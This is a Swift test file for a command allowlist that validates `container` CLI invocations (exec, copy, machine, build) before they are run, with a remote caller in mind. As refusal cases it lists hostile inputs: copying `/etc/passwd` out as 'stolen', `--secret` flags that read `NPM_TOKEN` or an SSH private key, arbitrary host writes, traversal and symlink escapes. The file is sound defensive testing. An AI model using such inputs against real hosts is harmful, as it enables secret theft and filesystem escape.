}

@Test func aBarePortIsNotAValidPublishValue() throws {
    // The CLI refuses `-p 9998` with `invalid publish value: 9998`. Our shape accepted it,
    // making it LOOSER than the CLI — the one direction that matters, since a too-loose shape
    // lets invalid input cross the boundary that Phase 2 exposes to a remote caller.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["run", "-p", "9998", "alpine"])
    }
    // The real forms still pass.
    for good in ["8080:80", "8080:80/tcp", "127.0.0.1:8080:80", "127.0.0.1:8080:80/udp"] {
        #expect(throws: Never.self, "should accept \(good)") {
            try Allowlist.validated(["run", "-p", good, "alpine"])
        }
    }
}

@Test func memoryAcceptsEveryDocumentedSuffix() throws {
    // K, M, G, T, P are all documented; T and P were rejected. Verified: `-m 1T` and `-m 1P`
    // both run.
    for good in ["512K", "512M", "2G", "1T", "1P", "1024"] {
        #expect(throws: Never.self, "should accept \(good)") {
            try Allowlist.validated(["run", "-m", good, "alpine"])
        }
    }
    #expect(throws: (any Error).self) { try Allowlist.validated(["run", "-m", "2X", "alpine"]) }
    #expect(throws: (any Error).self) { try Allowlist.validated(["run", "-m", "0", "alpine"]) }
}

// MARK: - ExecPolicy
//
// The Terminal tab needs `exec <id> sh`, which the default allowlist refuses on purpose. These
// pin both halves: that the refusal is still the default, and that opting in does not quietly
// widen anything else. The asymmetry IS the feature — a host serving a remote peer keeps the
// strict grammar while the machine's own owner gets a shell.

@Test("By default a shell inside a container is refused")
func defaultExecPolicyRefusesAShell() {
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "sh"])
    }
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "sh"], execPolicy: .processListOnly)
    }
}

@Test("The default still permits exactly the process-list query")
func defaultExecPolicyStillAllowsTheProcessList() throws {
    let validated = try Allowlist.validated(["exec", "web", "--", "ps", "-o", "pid,comm,args"])
    #expect(validated.arguments == ["exec", "web", "ps", "-o", "pid,comm,args"])
}

@Test("interactiveShell permits a shell, and emits NO -- separator")
func interactiveShellPermitsAShellWithoutASeparator() throws {
    let validated = try Allowlist.validated(["exec", "-i", "-t", "web", "--", "sh"],
                                            execPolicy: .interactiveShell)
    // The separator is required on input so parsing stays unambiguous, and must be absent
    // from the argv we execute: `container exec web -- sh` fails with "failed to find target
    // executable --". Verified against the live CLI, and invisible to a test that only
    // checks the command was built.
    #expect(!validated.arguments.contains("--"))
    #expect(validated.arguments == ["exec", "--interactive", "--tty", "web", "sh"])
}

@Test("interactiveShell widens exec and nothing else")
func interactiveShellDoesNotWidenOtherCommands() {
    // `run` still refuses a host bind mount under the default mount policy: two independent
    // boundaries, and opting into one must not relax the other.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["run", "--volume", "/Users:/host", "alpine"],
                                execPolicy: .interactiveShell)
    }
    // An unknown subcommand is still unknown.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["shell", "web"], execPolicy: .interactiveShell)
    }
}

@Test("interactiveShell still caps the command length")
func interactiveShellCapsTrailingTokens() {
    let tooMany = ["exec", "web", "--"] + Array(repeating: "x", count: 40)
    #expect(throws: (any Error).self) {
        try Allowlist.validated(tooMany, execPolicy: .interactiveShell)
    }
}

@Test("A ContainerCLI defaults to refusing shells")
func containerCLIDefaultsToStrictExec() {
    #expect(ContainerCLI(host: LocalHost(), wirePolicy: .localOwner).execPolicy == .processListOnly)
}

// MARK: - container copy
//
// `copy` touches the real filesystem in both directions, so these pin that the host end is
// gated by MountPolicy and not merely well-formed. The dangerous direction is a too-loose
// shape, and in Phase 2 this grammar faces a remote caller.

@Test("copy refuses a host path the mount policy does not permit")
func copyRefusesUnpermittedHostPaths() {
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["copy", "web:/etc/passwd", "/Users/someone/stolen"],
                                mountPolicy: .denyHostPaths)
    }
}

@Test("copy accepts a host path inside a permitted root")
func copyAcceptsPermittedHostPaths() throws {
    makeBuildFixtures()
    let validated = try Allowlist.validated(
        ["copy", "web:/etc/hostname", "/tmp/flotilla/hostname"],
        mountPolicy: .roots(["/tmp/flotilla"])
    )
    #expect(validated.arguments == ["copy", "web:/etc/hostname", "/tmp/flotilla/hostname"])
}

@Test("copy works in the upload direction too")
func copyAcceptsHostToContainer() throws {
    makeBuildFixtures()
    let validated = try Allowlist.validated(
        ["copy", "/tmp/flotilla/a.conf", "web:/etc/a.conf"],
        mountPolicy: .roots(["/tmp/flotilla"])
    )
    #expect(validated.arguments.count == 3)
}

@Test("copy refuses the filesystem root, traversal, and malformed endpoints")
func copyRefusesDangerousEndpoints() {
    makeBuildFixtures()
    for argv in [["copy", "web:/etc", "/"],
                 ["copy", "web:/etc/../../x", "/tmp/flotilla/x"],
                 ["copy", "web:", "/tmp/flotilla/x"],
                 ["copy", "not an identifier:/x", "/tmp/flotilla/x"],
                 ["copy", "web:relative/path", "/tmp/flotilla/x"]] {
        #expect(throws: (any Error).self) {
            try Allowlist.validated(argv, mountPolicy: .roots(["/tmp/flotilla"]))
        }
    }
}

@Test("copy needs exactly two endpoints")
func copyNeedsTwoOperands() {
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["copy", "web:/etc/hostname"], mountPolicy: .unrestricted)
    }
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["copy", "web:/a", "/tmp/b", "/tmp/c"], mountPolicy: .unrestricted)
    }
}

@Test("The Files tab's directory listing is accepted and canonicalises correctly")
func directoryListingArgvIsAccepted() throws {
    // What `ContainerCLI.listDirectory` builds. The inner `--` is for `ls`, not for us: it
    // stops a filename beginning with `-` being read as an ls flag.
    let validated = try Allowlist.validated(
        ["exec", "web", "--", "ls", "-la", "--", "/usr/share/nginx/html"],
        execPolicy: .interactiveShell
    )
    // Exactly one separator is consumed as grammar; `exec` receives none at all.
    #expect(validated.arguments == ["exec", "web", "ls", "-la", "--", "/usr/share/nginx/html"])
}

// MARK: - container machine
//
// A machine is the VM every container on the host runs inside, so these leaves are not ordinary
// additions. `research/VM-SECURITY-REVIEW.md` requires that unknown `set` keys be refused rather
// than forwarded, and that each leaf's own calling convention be encoded rather than inferred
// from the family — the conventions genuinely differ, which is the `volume create --size` trap.

@Test("machine set accepts exactly the three documented keys")
func machineSetAcceptsOnlyDocumentedKeys() throws {
    let validated = try Allowlist.validated(
        ["machine", "set", "-n", "dev", "cpus=4", "memory=8G", "home-mount=ro"])
    #expect(validated.arguments == ["machine", "set", "--name", "dev",
                                    "cpus=4", "memory=8G", "home-mount=ro"])
}

/// `machine create --home-mount` takes a **bare** `ro|rw|none`; `machine set` takes
/// `home-mount=ro` as an operand. Both spellings were live in the code at once — the allowlist
/// demanded the `key=value` form on create, which the CLI rejects, while the UI sent the form
/// the CLI wants, which the allowlist rejected. Creating a machine with a home-mount could not
/// succeed by either route.
///
/// The canonical-shape test passed throughout, because it asserted the same wrong spelling.
/// This one pins each leaf's form against the other's.
@Test("create and set spell home-mount differently, and each refuses the other's form")
func homeMountSpellingIsPerLeaf() throws {
    makeBuildFixtures()
    for mode in ["ro", "rw", "none"] {
        let validated = try Allowlist.validated(
            ["machine", "create", "--home-mount", mode, "alpine:3.22"])
        #expect(validated.arguments.contains(mode))
    }
    // The `set` spelling, on create.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["machine", "create", "--home-mount", "home-mount=ro",
                                 "alpine:3.22"])
    }
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["machine", "create", "--home-mount", "readonly",
                                 "alpine:3.22"])
    }
    // The `create` spelling, on set.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["machine", "set", "-n", "dev", "ro"])
    }
}

/// `machine run` with no trailing command opens an interactive shell, which needs a PTY on the
/// calling side. Without one it fails with "Operation not supported by device" *after* booting
/// the VM, so a Start button reported failure on a successful start. `startMachine` appends
/// `/bin/true`; this pins that the grammar accepts that form.
@Test("starting a machine boots it with a command, never a bare interactive shell")
func startMachinePassesABootCommand() throws {
    let validated = try Allowlist.validated(["machine", "run", "--name", "dev",
                                             "--", "/bin/true"])
    #expect(validated.arguments.contains("/bin/true"))
}

/// the review's high-severity finding, 9 August, and he is right.
///
/// The context operand was `min: 0` because the CLI defaults it to `.`. That reasoning was
/// about CLI convenience and the operand is a **security boundary**: an absent operand is not
/// "no host path", it is an *implicit* one — the process working directory — and the validator
/// only runs a shape check on operands that exist, so `MountPolicy` never sees it. Under
/// `.denyHostPaths` the build would still archive whatever directory the process happened to
/// be in. On the Phase 2 host peer that directory is an execution detail the remote caller
/// does not choose and the policy does not authorise.
///
/// Appending `.` ourselves would not fix it: a relative path cannot be checked against
/// absolute policy roots. The context must be named, absolutely.
@Test("build refuses an omitted context, because the CLI would silently use the cwd")
func omittedBuildContextIsRefused() {
    makeBuildFixtures()
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["build", "--tag", "app:latest"], mountPolicy: .denyHostPaths)
    }
    // Also refused when a Dockerfile *is* authorised — the context is a separate grant.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["build", "--file", "/tmp/allowed/Dockerfile"],
                                mountPolicy: .roots(["/tmp/allowed"]))
    }
    // A named, permitted context still works.
    #expect(throws: Never.self) {
        try Allowlist.validated(["build", "--tag", "app:latest", "/tmp/allowed"],
                                mountPolicy: .roots(["/tmp/allowed"]))
    }
}

/// The policy the app actually ships.
///
/// `startMachinePassesABootCommand` validated the boot argv under the **default** policy and
/// passed, while the same argv failed in the running app: `AppModel` builds its CLI with
/// `.interactiveShell`, which substituted a spec that forbids trailing commands. Machine Start
/// and Restart were dead on arrival and the suite was green. Every grammar with a policy-
/// dependent spec needs a case under the policy production uses, or the test proves nothing.
@Test("under .interactiveShell, machine run serves BOTH the boot command and the bare shell")
func bootAndShellBothWorkUnderTheAppsOwnPolicy() throws {
    makeBuildFixtures()
    // The boot form — what `startMachine` and therefore Restart send.
    let boot = try Allowlist.validated(["machine", "run", "--name", "dev", "--", "/bin/true"],
                                       execPolicy: .interactiveShell)
    #expect(boot.arguments.contains("/bin/true"))

    // The login shell — what the Shell tab opens.
    let shell = try Allowlist.validated(["machine", "run", "-n", "dev", "-i", "-t"],
                                        execPolicy: .interactiveShell)
    #expect(shell.arguments == ["machine", "run", "--name", "dev", "--interactive", "--tty"])

    // And the boot form still works under the strict default.
    #expect(throws: Never.self) {
        try Allowlist.validated(["machine", "run", "--name", "dev", "--", "/bin/true"])
    }
    // The permissive policy must not have become a way to run anything at all.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["machine", "run", "--name", "dev", "--", "/bin/sh"],
                                execPolicy: .interactiveShell)
    }
}

/// the review's Medium finding (9 August), narrowed to the half that can be closed.
///
/// `MountPolicy` keeps a nonexistent trailing component lexically, because a *mount* source
/// legitimately may not exist yet. For a build input that left a window: validate
/// `/tmp/allowed/context` while it does not exist, then drop a symlink to somewhere else into
/// place before `Process.run()`, and the CLI follows it out of the permitted root. Requiring the
/// path to exist removes the "create something in the gap" half — what remains is repointing an
/// existing object, which is narrower and needs a filesystem handle at the execution boundary to
/// close properly. That residue is recorded in the review rather than claimed as fixed.
@Test("a build input must exist when it is validated")
func buildInputMustExistAtValidationTime() throws {
    makeBuildFixtures()

    // The exact reproduction from the review: permitted root, absent context.
    let absent = "/tmp/allowed/definitely-not-here-\(#line)"
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["build", absent], mountPolicy: .roots(["/tmp/allowed"]))
    }
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["build", "--file", "/tmp/allowed/missing-Dockerfile",
                                 "/tmp/allowed"],
                                mountPolicy: .roots(["/tmp/allowed"]))
    }

    // An existing, permitted context still works — the rule must not be "refuse everything".
    #expect(throws: Never.self) {
        try Allowlist.validated(["build", "/tmp/allowed"], mountPolicy: .roots(["/tmp/allowed"]))
    }
}

@Test("machine set refuses an unknown key rather than forwarding it")
func machineSetRefusesUnknownKeys() {
    // The review's exact concern: "unknown future keys could silently add privilege". A key
    // this build has never heard of must not be passed through on the hope the CLI checks it.
    for setting in ["rosetta=true", "kernel=/tmp/vmlinux", "privileged=yes", "cpu=4", "mem=8G"] {
        #expect(throws: (any Error).self) {
            try Allowlist.validated(["machine", "set", "-n", "dev", setting])
        }
    }
}

@Test("home-mount accepts only ro, rw and none")
func homeMountDomainIsClosed() throws {
    for mode in ["ro", "rw", "none"] {
        _ = try Allowlist.validated(["machine", "set", "-n", "dev", "home-mount=\(mode)"])
    }
    // `home-mount` names a MODE, not a path — there is nothing for MountPolicy to check here.
    // Whether a remote caller may set it at all is an authorisation question the transport
    // answers, not a grammar one. See the note on `checkMachineSetting`.
    for bad in ["home-mount=readwrite", "home-mount=/Users/someone", "home-mount=", "home-mount=RW"] {
        #expect(throws: (any Error).self) {
            try Allowlist.validated(["machine", "set", "-n", "dev", bad])
        }
    }
}

@Test("machine set bounds cpus and memory")
func machineSetBoundsResourceValues() {
    for setting in ["cpus=0", "cpus=99999", "cpus=-1", "cpus=four", "memory=lots", "memory=8Q"] {
        #expect(throws: (any Error).self) {
            try Allowlist.validated(["machine", "set", "-n", "dev", setting])
        }
    }
}

@Test("delete and set-default REQUIRE the machine id; stop, inspect and logs do not")
func machineOperandRequirementsMatchEachLeaf() throws {
    // The asymmetry is the CLI's own and this is the right way round: a bare `machine delete`
    // would silently destroy the DEFAULT machine, so it has to be named.
    #expect(throws: (any Error).self) { try Allowlist.validated(["machine", "delete"]) }
    #expect(throws: (any Error).self) { try Allowlist.validated(["machine", "set-default"]) }

    // These three legitimately default to the default machine.
    _ = try Allowlist.validated(["machine", "stop"])
    _ = try Allowlist.validated(["machine", "inspect"])
    _ = try Allowlist.validated(["machine", "logs"])
}

@Test("machine create validates the image reference and its inline sizing")
func machineCreateValidatesImageAndSizing() throws {
    let validated = try Allowlist.validated(
        ["machine", "create", "-n", "dev", "--cpus", "4", "--memory", "8G", "alpine:3.22"])
    #expect(validated.arguments.contains("alpine:3.22"))
    #expect(validated.mutates)

    // An image reference, not a free string — same shape the rest of the allowlist uses.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["machine", "create", "not a valid ref!!"])
    }
    // Unicode lookalikes are rejected by `.imageReference` exactly as they are elsewhere.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["machine", "create", "аlpine:3.22"])
    }
}

@Test("the machine family does not accept each other's calling conventions")
func machineLeavesDoNotShareOneConvention() {
    // `stop` is positional-only: `-n` is not one of its flags.
    #expect(throws: (any Error).self) { try Allowlist.validated(["machine", "stop", "-n", "dev"]) }
    // `set` needs its settings; a name alone is not a command.
    #expect(throws: (any Error).self) { try Allowlist.validated(["machine", "set", "-n", "dev"]) }
    // `list` takes no operand at all.
    #expect(throws: (any Error).self) { try Allowlist.validated(["machine", "list", "dev"]) }
}

// MARK: - container build
//
// `build` is the widest grammar in the table, and the risk is in its flags rather than its
// verb: three of them reach the host filesystem and environment, and in Phase 2 this same
// grammar faces a REMOTE caller. Every shape below is checked against the captured help
// (`reference/cli-help/container-build-1.0.0-help.txt`), which is the only authority — the
// CLI cannot be run from here, so nothing is inferred from what "should" work.
//
// The refusal tests matter more than the acceptance ones. Each names a flag the CLI really
// does offer, which is exactly why leaving it out has to be pinned: a later reader adding
// "the missing flags" from the help text would otherwise reopen every one of these holes.

/// Every banned flag is asserted to fail as `unknownFlag`, not merely to fail.
///
/// The context directory in each case is inside the permitted root on purpose, so the *only*
/// thing left to object to is the flag. Otherwise these would still be green with `--secret`
/// fully allowlisted — the mount policy would be refusing the path and the test would be
/// reporting a protection it never checked. That confound has bitten this project before.
private func requireUnknownFlag(
    _ flag: String,
    in args: [String],
    sourceLocation: SourceLocation = #_sourceLocation
) {
    #expect(Allowlist.validate(args, mountPolicy: .roots(["/tmp"])) == .failure(.unknownFlag(flag)),
            "\(args) was not refused as an unknown \(flag)",
            sourceLocation: sourceLocation)
}

@Test("build refuses --secret: it reads host env vars and host files")
func buildRefusesSecret() {
    makeBuildFixtures()
    // `--secret id=<key>[,env=<ENV_VAR>|,src=<local/path>]`. `env=` lifts a host environment
    // variable and `src=` a host file, both into a build the caller controls — an
    // exfiltration primitive the moment a remote peer can name it, and one that MountPolicy
    // would not see because the path is buried inside an opaque `id=…,src=…` blob.
    requireUnknownFlag("--secret", in: ["build", "--secret", "id=npm,env=NPM_TOKEN", "/tmp/build"])
    requireUnknownFlag("--secret", in: ["build", "--secret",
                                        "id=ssh,src=/Users/someone/.ssh/id_ed25519", "/tmp/build"])
    requireUnknownFlag("--secret", in: ["build", "--secret=id=npm,env=NPM_TOKEN", "/tmp/build"])
}

@Test("build refuses --output: type=local,dest= writes an arbitrary host path")
func buildRefusesOutput() {
    makeBuildFixtures()
    // The default `type=oci` is what we want anyway, so the flag buys nothing and costs a
    // write primitive. The short spelling is refused too — a refusal that only covers the
    // long form is not a refusal.
    requireUnknownFlag("--output", in: ["build", "--output",
                                        "type=local,dest=/Users/someone/Library", "/tmp/build"])
    requireUnknownFlag("-o", in: ["build", "-o", "type=tar,dest=/tmp/out.tar", "/tmp/build"])
    requireUnknownFlag("--output", in: ["build", "--output=type=oci", "/tmp/build"])
}

@Test("build refuses --vsock-port: internal builder plumbing is not a caller's choice")
func buildRefusesVsockPort() {
    makeBuildFixtures()
    requireUnknownFlag("--vsock-port", in: ["build", "--vsock-port", "8088", "/tmp/build"])
}

@Test("build refuses the whole --dns family, deferred for want of a use case")
func buildRefusesDNSFlags() {
    makeBuildFixtures()
    // Default-deny means "no use case yet" is spelled "not in the table". Listed here per
    // flag so that adding one back is a deliberate act with a failing test attached.
    for flag in ["--dns", "--dns-domain", "--dns-option", "--dns-search"] {
        requireUnknownFlag(flag, in: ["build", flag, "10.0.0.1", "/tmp/build"])
    }
}

@Test("a build context outside the mount policy's roots is refused")
func buildRefusesContextOutsidePermittedRoots() {
    makeBuildFixtures()
    // A context is a whole directory TREE, archived and handed to the builder — a broader
    // read grant than `copy`'s single file. `/Users` as a context is every SSH key on the
    // machine, and the grammar alone cannot tell that apart from a project directory.
    //
    // Asserted as `hostPathNotPermitted` rather than "throws", because that is the difference
    // between the policy refusing the path and the shape refusing the string. A path this
    // well-formed must be stopped by the policy or by nothing.
    #expect(Allowlist.validate(["build", "/Users/someone/src"], mountPolicy: .roots(["/tmp/flotilla"]))
            == .failure(.hostPathNotPermitted(context: "<hostBuildPath>", path: "/Users/someone/src")))
    // The default policy permits nothing, so an explicit path is refused outright.
    #expect(Allowlist.validate(["build", "/tmp/flotilla"], mountPolicy: .denyHostPaths)
            == .failure(.hostPathNotPermitted(context: "<hostBuildPath>", path: "/tmp/flotilla")))
    // `--file` is a host path too, and is checked by the same policy — a permitted context
    // must not smuggle an unpermitted Dockerfile in beside it.
    #expect(Allowlist.validate(["build", "-f", "/Users/someone/Dockerfile", "/tmp/flotilla"],
                               mountPolicy: .roots(["/tmp/flotilla"]))
            == .failure(.hostPathNotPermitted(context: "--file", path: "/Users/someone/Dockerfile")))
    // Neither is a relative path, a traversal, nor the filesystem root.
    for context in [".", "../src", "/tmp/flotilla/../../etc", "/"] {
        #expect(throws: (any Error).self, "accepted context \(context)") {
            try Allowlist.validated(["build", context], mountPolicy: .roots(["/tmp/flotilla"]))
        }
    }
}

@Test("a build context inside a permitted root is allowed")
func buildAcceptsContextInsidePermittedRoots() throws {
    makeBuildFixtures()
    let validated = try Allowlist.validated(
        ["build", "-f", "/tmp/flotilla/Dockerfile", "-t", "app:latest", "/tmp/flotilla/src"],
        mountPolicy: .roots(["/tmp/flotilla"])
    )
    #expect(validated.arguments == ["build", "--file", "/tmp/flotilla/Dockerfile",
                                    "--tag", "app:latest", "/tmp/flotilla/src"])
    #expect(validated.mutates)
    // Generous: a build pulls base images and compiles.
    #expect(validated.timeoutHint == 1800)
}

@Test("build takes exactly one context, never two")
func buildTakesExactlyOneContext() throws {
    makeBuildFixtures()
    // This test used to assert the opposite — that omitting the context was fine "because the
    // CLI defaults it to `.`, so no host path is named and none is granted". That was wrong,
    // and wrong in the dangerous direction: `.` IS a host path, just an implicit one, and the
    // validator never shape-checks an operand that is not there. See
    // `omittedBuildContextIsRefused`.
    let validated = try Allowlist.validated(["build", "-t", "app:latest", "/tmp/flotilla/src"],
                                            mountPolicy: .roots(["/tmp/flotilla"]))
    #expect(validated.arguments == ["build", "--tag", "app:latest", "/tmp/flotilla/src"])
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["build", "/tmp/flotilla", "/tmp/other"],
                                mountPolicy: .roots(["/tmp"]))
    }
}

@Test("--progress accepts only auto, plain and tty")
func buildProgressIsAClosedSet() throws {
    makeBuildFixtures()
    for good in ["auto", "plain", "tty"] {
        #expect(throws: Never.self, "should accept \(good)") {
            try Allowlist.validated(["build", "--progress", good, "/tmp/flotilla"],
                                    mountPolicy: .roots(["/tmp/flotilla"]))
        }
    }
    // The capture lists exactly three. Anything else is refused here, where the message names
    // the rule, rather than forwarded for the CLI to answer with a usage dump.
    for bad in ["json", "TTY", "Plain", "auto,plain", "", "quiet"] {
        #expect(throws: (any Error).self, "should reject '\(bad)'") {
            try Allowlist.validated(["build", "--progress", bad, "/tmp/flotilla"],
                                    mountPolicy: .roots(["/tmp/flotilla"]))
        }
    }
}

@Test("build's remaining values keep the shapes the rest of the table uses")
func buildValidatesItsOtherFlagValues() {
    // No special-casing because it is a build: a tag is an image reference, a build-arg is a
    // KEY=VALUE, a label is a key=value, and a Unicode lookalike is refused as it is anywhere.
    for argv in [["build", "-t", "not a ref!!"],
                 ["build", "-t", "аpp:latest"],          // Cyrillic а
                 ["build", "--build-arg", "novalue"],
                 ["build", "--build-arg", "9BAD=x"],
                 ["build", "--label", "novalue"],
                 ["build", "--platform", "linux"],
                 ["build", "--target", "../etc"],
                 ["build", "--cpus", "0"],
                 ["build", "--memory", "8Q"],
                 ["build", "--no-cache=true"],
                 ["build", "--pull", "yes"]] {
        #expect(throws: (any Error).self, "accepted \(argv)") {
            try Allowlist.validated(argv, mountPolicy: .denyHostPaths)
        }
    }
}

@Test("banned build flags stay unreachable through alternate parser routes")
func bannedBuildFlagsHaveNoAlternateParserRoute() {
    makeBuildFixtures()
    let cases: [[String]] = [
        // Long-option abbreviation is not accepted by the allowlist parser.
        ["build", "--sec", "id=npm,env=NPM_TOKEN", "/tmp/build"],
        ["build", "--out", "type=local,dest=/tmp/out", "/tmp/build"],
        ["build", "--vsock", "8088", "/tmp/build"],
        ["build", "--dns-dom", "example.test", "/tmp/build"],

        // Inline values still resolve the exact long name before inspecting the value.
        ["build", "--secret=id=npm,env=NPM_TOKEN", "/tmp/build"],
        ["build", "--output=type=local,dest=/tmp/out", "/tmp/build"],
        ["build", "--vsock-port=8088", "/tmp/build"],
        ["build", "--dns=10.0.0.1", "/tmp/build"],
        ["build", "--dns-domain=example.test", "/tmp/build"],
        ["build", "--dns-option=ndots:1", "/tmp/build"],
        ["build", "--dns-search=example.test", "/tmp/build"],

        // The first occurrence fails; repetition cannot change interpretation.
        ["build", "--secret", "id=a,env=A", "--secret", "id=b,env=B", "/tmp/build"],
        ["build", "--dns", "10.0.0.1", "--dns", "10.0.0.2", "/tmp/build"],

        // Options remain options after the context operand, and build forbids `--` trailing.
        ["build", "/tmp/build", "--secret=id=npm,env=NPM_TOKEN"],
        ["build", "/tmp/build", "--output=type=local,dest=/tmp/out"],
        ["build", "/tmp/build", "--", "--secret=id=npm,env=NPM_TOKEN"],

        // The CLI's short spelling for output is absent too.
        ["build", "-o", "type=local,dest=/tmp/out", "/tmp/build"],
    ]

    for argv in cases {
        #expect(throws: (any Error).self, "accepted \(argv)") {
            try Allowlist.validated(argv, mountPolicy: .roots(["/tmp"]))
        }
    }
}

@Test("both explicit build paths reject an existing symlink escape")
func explicitBuildPathsRejectExistingSymlinkEscapes() throws {
    let fileManager = FileManager.default
    let base = fileManager.temporaryDirectory
        .appendingPathComponent("FlotillaBuildPolicy-\(UUID().uuidString)")
    let permitted = base.appendingPathComponent("permitted")
    let outside = base.appendingPathComponent("outside")
    let escape = permitted.appendingPathComponent("escape")
    defer { try? fileManager.removeItem(at: base) }

    try fileManager.createDirectory(at: permitted, withIntermediateDirectories: true)
    try fileManager.createDirectory(at: outside, withIntermediateDirectories: true)
    try fileManager.createSymbolicLink(at: escape, withDestinationURL: outside)

    let escapedContext = escape.appendingPathComponent("context").path
    let escapedFile = escape.appendingPathComponent("Dockerfile").path
    let policy = MountPolicy.roots([permitted.path])

    #expect(throws: (any Error).self) {
        try Allowlist.validated(["build", escapedContext], mountPolicy: policy)
    }
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["build", "--file", escapedFile, permitted.path],
                                mountPolicy: policy)
    }
}

// MARK: - Build fixtures on disk

/// Creates the paths the `build` tests validate against.
///
/// `.hostBuildPath` now requires the path to **exist**, which is the review's Medium finding narrowed:
/// a build input that does not exist yet leaves a window in which a symlink can be dropped into
/// place between validation and `Process.run()`. Tests therefore need real directories rather
/// than plausible strings — and that is the right way round. A grammar test that passes only
/// because nothing checks the filesystem is testing a rule the shipping code does not have.
///
/// Idempotent, and `/tmp` exists on both macOS and the Linux CI that runs `FlotillaCore`.
@discardableResult
func makeBuildFixtures() -> Bool {
    let manager = FileManager.default
    for directory in ["/tmp/flotilla", "/tmp/flotilla/src", "/tmp/allowed", "/tmp/build"] {
        try? manager.createDirectory(atPath: directory, withIntermediateDirectories: true)
    }
    for file in ["/tmp/flotilla/Dockerfile", "/tmp/allowed/Dockerfile",
                 "/tmp/build/Dockerfile"] {
        if !manager.fileExists(atPath: file) {
            manager.createFile(atPath: file, contents: Data("FROM alpine:3.22\n".utf8))
        }
    }
    return manager.fileExists(atPath: "/tmp/flotilla/src")
}
